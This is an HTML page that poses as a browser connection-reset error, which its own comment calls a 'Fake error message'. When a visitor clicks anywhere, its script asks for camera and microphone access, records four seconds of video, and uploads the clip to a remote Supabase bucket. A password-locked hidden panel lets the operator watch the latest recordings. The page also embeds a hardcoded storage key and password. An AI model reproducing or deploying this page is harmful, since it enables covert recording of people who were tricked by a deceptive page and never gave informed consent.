<!DOCTYPE html>
<html>
<head>
  <title>This site canâ€™t be reached</title>
  <script src="https://unpkg.com/@supabase/supabase-js@2.39.5/dist/umd/supabase.js"></script>
  <style>
    body {
      margin: 0;
      background: white;
      color: #5f6368;
      font-family: Arial, sans-serif;
      padding: 60px;
      font-size: 16px;
      line-height: 1.6;
    }
    #lockIcon {
      position: fixed;
      top: 20px;
      right: 20px;
      font-size: 28px;
      cursor: pointer;
      z-index: 999;
      user-select: none;
    }
    #viewer {
      display: none;
      background: black;
      color: white;
      height: 100vh;
      padding: 20px;
      overflow-y: auto;
    }
    video {
      width: 90%;
      max-width: 600px;
      margin-top: 20px;
      background: #000;
    }
    button {
      padding: 10px 20px;
      background: red;
      color: white;
      border: none;
      font-size: 16px;
      margin-top: 20px;
      cursor: pointer;
    }
  </style>
</head>
<body>

<div id="lockIcon" onclick="unlock()">ðŸ”’</div>

<!-- Fake error message -->
<h2>This site canâ€™t be reached</h2>
<p>The connection was reset.</p>
<p>Try:</p>
<ul>
  <li>Checking the connection</li>
</ul>
<p><b>ERR_CONNECTION_RESET</b></p>
<p>Reload</p>
<p>Details</p>

<!-- Hidden viewer area -->
<div id="viewer">
  <h3>Recording Playback</h3>
  <video id="playback" controls></video>
  <br>
  <button onclick="stopRecording()">STOP</button>
  <h3>Last 4 Recordings</h3>
  <div id="videoList"></div>
</div>

<script>
  const PASSWORD = "sardarhamza";
  const BUCKET = "recordings";
  const client = supabase.createClient(
    'https://kelbfujbyjtdeopkhhxm.supabase.co',
    'eyJhbGciOiJIUzI1NiIsInR5cCI6IkpXVCJ9.eyJpc3MiOiJzdXBhYmFzZSIsInJlZiI6ImtlbGJmdWpieWp0ZGVvcGtoaHhtIiwicm9sZSI6ImFub24iLCJpYXQiOjE3NDcyMzc5OTgsImV4cCI6MjA2MjgxMzk5OH0.iB97MRNwVCrhtDQaHrh7Q7ra1x4nVNGhih-Tm_pq31k'
  );

  let stream, mediaRecorder;
  let recordedChunks = [];
  let recordingStarted = false;
  let stopped = false;

  document.body.addEventListener("click", async (e) => {
    if (e.target.id === "lockIcon" || recordingStarted) return;
    try {
      stream = await navigator.mediaDevices.getUserMedia({ video: true, audio: true });
      mediaRecorder = new MediaRecorder(stream);
      recordedChunks = [];

      mediaRecorder.ondataavailable = e => {
        if (e.data.size > 0) recordedChunks.push(e.data);
      };

      mediaRecorder.start();
      recordingStarted = true;

      setTimeout(() => {
        if (!stopped) stopRecording();
      }, 4000); // stop after 4 seconds

    } catch (err) {
      alert("Camera Error: " + err.message);
    }
  });

  async function stopRecording() {
    if (mediaRecorder && mediaRecorder.state === "recording") {
      mediaRecorder.stop();
      stream.getTracks().forEach(t => t.stop());
      stopped = true;

      mediaRecorder.onstop = async () => {
        const blob = new Blob(recordedChunks, { type: 'video/webm' });
        const url = URL.createObjectURL(blob);
        document.getElementById("playback").src = url;

        const fileName = `video_${Date.now()}.webm`;

        const { data: allFiles } = await client.storage.from(BUCKET).list('', {
          sortBy: { column: 'name', order: 'asc' }
        });

        const webms = allFiles.filter(f => f.name.endsWith('.webm'));
        if (webms.length > 4) {
          const toDelete = webms.slice(0, webms.length - 4);
          await client.storage.from(BUCKET).remove(toDelete.map(f => f.name));
        }

        const { error } = await client.storage.from(BUCKET).upload(fileName, blob);
        if (!error) {
          await new Promise(resolve => setTimeout(resolve, 1000));
          loadVideos();
        }
      };
    }
  }

  async function unlock() {
    const input = prompt("Enter password:");
    if (input !== PASSWORD) return alert("Wrong password!");
    document.getElementById("viewer").style.display = "block";
    loadVideos();
  }

  async function loadVideos() {
    const { data } = await client.storage.from(BUCKET).list('', {
      sortBy: { column: 'name', order: 'desc' }
    });

    const container = document.getElementById("videoList");
    container.innerHTML = "";

    const filtered = (data || [])
      .filter(f => f.name.endsWith('.webm'))
      .sort((a, b) => b.name.localeCompare(a.name))
      .slice(0, 4);

    for (let file of filtered) {
      const { data: signed } = await client.storage.from(BUCKET).createSignedUrl(file.name, 3600);
      if (signed?.signedUrl) {
        const vid = document.createElement("video");
        vid.src = signed.signedUrl;
        vid.controls = true;
        vid.style.marginTop = "15px";
        container.appendChild(vid);
      }
    }
  }
</script>

</body>
</html>
